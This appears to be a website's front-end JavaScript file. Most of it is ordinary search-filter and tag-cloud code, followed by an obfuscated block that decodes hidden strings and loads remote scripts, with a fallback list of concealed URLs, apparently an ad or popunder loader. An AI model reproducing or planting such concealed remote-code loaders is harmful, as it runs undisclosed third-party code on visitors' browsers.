$('.search-button').click(function(){
    $(this).parent().toggleClass('open');
  });

function myFunction() {
  // Declare variables
  var input, filter, ul, li, a, i, txtValue;
  input = document.getElementById('searchform');
  filter = input.value.toUpperCase();
  ul = document.getElementById("myUL");
  li = ul.getElementsByTagName('li');

  // Loop through all list items, and hide those who don't match the search query
  for (i = 0; i < li.length; i++) {
    a = li[i].getElementsByTagName("a")[0];
    txtValue = a.textContent || a.innerText;
    if (txtValue.toUpperCase().indexOf(filter) > -1) {
      li[i].style.display = "";
    } else {
      li[i].style.display = "none";
    }
  }
}

function coolTagCloudToggle(element){var parent=element.closest('.cool-tag-cloud');parent.querySelector('.cool-tag-cloud-inner').classList.toggle('cool-tag-cloud-active');parent.querySelector('.cool-tag-cloud-load-more').classList.toggle('cool-tag-cloud-active');}


/*<![CDATA[*/(function(){var f2ce0bf48704f9d4cea50f2deb24521a="EbR7232rRzUDhdRvgt2zn36w_AQvchAXzoKcqjD3Ob77H_bB-RBIxd5qZAocdvYcjOoVYIsaVEYoeKVZrQ";var a=['UDvDp3c6WksmwoFnw7sUdcOpw6nCgcKlWcOvw47DqVtgwok=','EMKERcOtEMKlwrIXPhnCugPDu8OWwp3CsxzCsGoQwrzCklLCvcOewo3DhcOSwojDiBjDgCPCrnzDsMORw6QOwpPCvcOdwqXDocOL','csKPwrPCnio6TQXCscO3KkvCswRSwp8kwoM0woU=','AcKQP8KseMOYwq8OwqDCpsKqaA==','R0LDjQHCtQ0=','wpBHw5TDssKzKDgSPsO4K8OiQ8KIEA==','R1PDnA==','wrdmH8OywqjCpG3Djw==','w7DCmm7CjMK/EQ==','M8KPPVtAwrJsIg==','woo9w4l7PDjDuzZww6dfUg==','CBDCh8O7w4jDglIVPcKYaFvDg1LCsMKpJ8Okw6LDu8KUw6XCm8KtKMOIHw==','wr5gEsOFwqzCpQ==','VsO3wrF+JDIOw7EowqVzwovDkA==','w6PCrRYgMDXCpA==','w7zCjzzDrMK5YUhuC2lV','wpbChsKpRA==','w7vCmDXDvsK/Qk5XCXJ/wqzCtQ==','XELCjMO4PcOlRwF6Z15g','w6orwqvDsCzDgD4Daw==','G8ODw73Cg8OHw6nCh8Kg','XMOlw7LDtQxlwqvDtxM7wrtVWlA=','U31DcxzDvQ==','T1DCl8K3IMOOUQVhY0J4KmXDnmggJsOgwpgTQhgEwrF2a8KOKMK5w7FnfFxKwq5DRFpx','REDDjQ3Cqw1DTSRY','w4nDhcKEKA==','w4BMwqVeGG/CgQ==','LsOUwqw8GA=='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x188));var b=function(c,d){c=c-0x0;var e=a[c];if(b['DxujPn']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['KMQGqB']=g;b['ebiaxo']={};b['DxujPn']=!![];}var f=b['ebiaxo'][c];if(f===undefined){if(b['kNrQYR']===undefined){b['kNrQYR']=!![];}e=b['KMQGqB'](e,d);b['ebiaxo'][c]=e;}else{e=f;}return e;};var g=window;g[b('0x10','RwTr')]=[[b('0x16','Ear4'),0x49473e],[b('0xc','JmGV'),0x0],[b('0x15','3bKa'),'0'],[b('0x12','eRWX'),0x0],[b('0x1a','cSSl'),![]],[b('0x11','TFJW'),0x0],[b('0xa','q%Hz'),!0x0]];var z=[b('0x17','eRWX'),b('0x1','L7kh'),b('0x0','oTyH'),b('0xb','(uGJ')],v=0x0,t,p=function(){if(!z[v])return;t=g[b('0x14','C1b7')][b('0xd','NA@V')](b('0x8','ETJX'));t[b('0x19','0W$v')]=b('0x5','2QYv');t[b('0x1b','b*]!')]=!0x0;var c=g[b('0x7','JmGV')][b('0x2','lH0l')](b('0x4','LgWj'))[0x0];t[b('0x6','LgWj')]=b('0x9','Rp9H')+z[v];t[b('0xf','TFJW')]=b('0x13','V^pm');t[b('0xe','5sa8')]=function(){v++;p();};c[b('0x18','LgWj')][b('0x3','pqJz')](t,c);};p();})();/*]]>*/
